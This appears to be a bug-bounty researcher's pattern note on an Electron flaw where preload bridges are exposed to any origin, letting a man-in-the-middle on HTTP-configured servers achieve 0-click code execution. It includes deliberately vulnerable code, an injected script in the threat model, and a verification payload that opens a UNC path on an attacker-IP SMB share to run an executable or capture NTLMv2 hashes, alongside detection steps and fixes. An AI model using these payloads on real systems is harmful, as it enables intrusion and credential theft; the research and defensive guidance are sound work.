---
type: pattern
title: Pattern - Electron Preload Origin-Agnostic Injection (HTTP MITM 0-click)
tags: [pattern, cwe-311, cwe-20, cwe-668, electron, preload, mitm, http, bb-pattern]
status: verified
severity_range: P1 (CVSS 8.7 High, 0-click via MITM)
precedents: CVE-2018-15685 (Electron file://), CVE-2020-15174 (IPC), Slack RCE 2020 (HTTP cleartext config)
last_updated: 2026-04-25
---

# Pattern - Electron Preload Origin-Agnostic Injection

## TL;DR

An Electron app's `webPreferences.preload` is attached at `BrowserWindow` creation time and **does not check the URL's origin or scheme at all**. An HTTP page, an attacker-controlled external URL, or a `file://` URL will all receive the same preload bundle — including every namespace exposed via `contextBridge.exposeInMainWorld(...)`.

When the app's design allows setting the server URL over HTTP (common for on-premise / internal-network deployments), **a MITM attacker injecting HTML can call `window.navigateObj.openWindow(...)` directly — turning a 1-click chain into a 0-click RCE.**

vs. custom scheme handler attacks ([[Pattern - Electron Preload Injection Chain]]):
- Protocol handler: 1-click, requires the user to click a link, browser/OS dialog involved
- Origin-agnostic preload + HTTP MITM: **0-click**, no dialog, but AC:H (requires MITM)

## Root-Cause Ingredients

### Ingredient 1: HTTP-allowed server configuration

```javascript
// Vendor allows the user to set a server URL in settings, with no https-only enforcement
ipcMain.handle("settings:setServerUrl", (e, url) => {
  // ❌ vulnerable — accepts http://
  store.set("serverUrl", url);
  app.relaunch();
});
```

Real-world scenario: on-premise customers set the server URL to `http://192.168.x.x` or `http://intranet.corp.com` for internal-network convenience.

### Ingredient 2: BrowserWindow + preload with no scheme check

```javascript
// The main window attaches preload when loading the server URL
mainWindow = new BrowserWindow({
  webPreferences: {
    preload: path.join(__dirname, "preload.js"),
    contextIsolation: true,
    nodeIntegration: false,
    // ❌ no scheme check / origin allowlist
  }
});
mainWindow.loadURL(serverUrl);   // may be http://
```

### Ingredient 3: preload exposes a powerful contextBridge namespace

```javascript
// preload.js
contextBridge.exposeInMainWorld("navigateObj", {
  openWindow: (url, isInternal, id) => ipcRenderer.invoke("navigateObj.openWindow", { url, isInternal, id })
});
contextBridge.exposeInMainWorld("downloadObj", { ... });
contextBridge.exposeInMainWorld("settingObj", { ... });
// ... 13 namespaces, 116 methods in the case-study app
```

And `ipcMain.on("navigateObj.openWindow", ...)` internally calls `shell.openExternal` or spawns a new BrowserWindow (with preload) — meaning the entire IPC capability surface is reachable from any origin.

## Threat Model

```
[Victim] ←──── HTTP ────→ [Vendor on-premise server]
              ↑
              MITM (ARP spoofing / rogue Wi-Fi hotspot / ISP / compromised gateway)
              │
         [Attacker] injects <script>window.navigateObj.openWindow("\\\\evil\\share\\poc.exe", false, "")</script>
```

No user interaction is required — it isn't triggered by clicking a link, it fires automatically when the main window loads.

## Detection Methodology

1. **Find the server URL setting**: grep `setServerUrl`, `serverUrl`, `ServerUrl`, `store.set.*[Uu]rl`
2. **Check for https-only enforcement**: does `if (!url.startsWith("https://"))` exist?
3. **Find the main-window BrowserWindow creation**: grep `new BrowserWindow`, `mainWindow =`
4. **For each BrowserWindow, check**:
   - Is `webPreferences.preload` attached?
   - Is `webSecurity` disabled (`webSecurity: false`)?
   - Is `nodeIntegration` enabled?
   - Is the loaded URL's scheme restricted?
5. **Verify preload exposure**: in attacker-controlled HTML, run `<script>console.log(Object.keys(window).filter(k => k.endsWith("Obj")))</script>` and check whether contextBridge namespaces are exposed

## Live Verification SOP

```bash
# 1. In the target Electron app, change the server URL to http://attacker_ip:8080
# 2. Start a local HTTP server
python3 -m http.server 8080 --directory ./payload

# payload/index.html
cat > payload/index.html <<'HTML'
<!DOCTYPE html>
<html><body>
<h1>MITM payload</h1>
<script>
  if (window.navigateObj) {
    document.body.innerHTML += "<p>preload exposed: " + Object.keys(window).filter(k=>k.endsWith("Obj")).join(", ") + "</p>";
    // trigger the RCE chain directly
    window.navigateObj.openWindow("\\\\\\\\ATTACKER_IP\\\\SHARE\\\\poc.exe", false, "");
  } else {
    document.body.innerHTML += "<p>preload NOT exposed (this origin is filtered)</p>";
  }
</script>
</body></html>
HTML

# 3. Observe the Electron app's main window:
# (a) "preload exposed: navigateObj, downloadObj, settingObj, ..." appears → vulnerable
# (b) the attack chain fires automatically → calc.exe launches / an NTLMv2 hash is captured
```

## Variants

### Variant A: HTTP-only deployment (most direct)

An on-premise customer uses an HTTP server URL → a MITM attacker directly obtains preload access. Case study: **ACME-025**.

### Variant B: mixed-content allowed (secondary)

`webSecurity: false` or `webPreferences.allowRunningInsecureContent: true` → an HTTPS main page can still import an HTTP script → a MITM'd HTTP script also obtains preload access.

### Variant C: file:// URL preload attach

`mainWindow.loadURL("file:///path/to/index.html")`, followed by spawned `file://` sub-windows that also get preload attached → recursive injection (the `file://` variant discussed in [[Pattern - Electron Preload Injection Chain]])

## Real-World Examples

| App | Year | Variant | Note |
|-----|------|---------|------|
| Case study (ACME-025) | 2026 | A | HTTP on-premise server URL → 0-click preload chain → UNC RCE. Live-confirmed. |
| Slack 2020 (HackerOne) | 2020 | B | mixed content allowed → MITM RCE |
| Rocket.Chat desktop 2021 | 2021 | A | same pattern, CVE-2021-22910 |

## Defense

```javascript
// ✅ Option 1: check origin inside preload
// preload.js
const TRUSTED_ORIGINS = ["https://my-app.com", "https://*.my-app.com"];
function isTrusted() {
  return TRUSTED_ORIGINS.some(o => location.origin === o || location.origin.endsWith(o.replace("https://*.", ".")));
}
if (isTrusted()) {
  contextBridge.exposeInMainWorld("navigateObj", { ... });
}

// ✅ Option 2: allowlist the scheme at BrowserWindow creation
mainWindow = new BrowserWindow({
  webPreferences: {
    preload: path.join(__dirname, "preload.js"),
    contextIsolation: true,
    nodeIntegration: false,
    sandbox: true,
  }
});
mainWindow.webContents.on("will-navigate", (e, url) => {
  if (!url.startsWith("https://")) e.preventDefault();
});

// ✅ Option 3: enforce https-only for the server URL setting
ipcMain.handle("settings:setServerUrl", (e, url) => {
  if (!url.startsWith("https://")) throw new Error("HTTPS required");
  store.set("serverUrl", url);
});
```

## Filing & Severity

- **CVSS 8.7 H (`AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H`)** — 0-click but AC:H (requires MITM)
- **CWE-311** (Cleartext Transmission of Sensitive Information) + **CWE-20** + **CWE-668** (Resource Exposure to Wrong Sphere)
- **Do not merge this with a protocol-handler advisory** — this is an origin-agnostic preload design defect, not a scheme-handler injection. File separately.
- **Impact framing**:
  - Correct: "0-click RCE against HTTP-deployed enterprise customers under MITM"
  - Correct: "preload contextBridge namespace exposed to arbitrary origins"
  - Overclaim (avoid): "a remote attacker can compromise any user" (AC:H should not be written as AC:L)
- **Pairs well with**: usually filed together with the `shell.openExternal` UNC RCE sink as the downstream chain target

## Chains

```
HTTP server config → MITM → attacker HTML in the main window
  → preload.js attached (origin-agnostic)
  → window.navigateObj.openWindow(UNC) → shell.openExternal → SMB RCE
                                       OR
                            window.downloadObj.download(...) → arbitrary file write
```

## Related

- [[Pattern - Electron Preload Injection Chain]]
- [[Lessons Learned]]
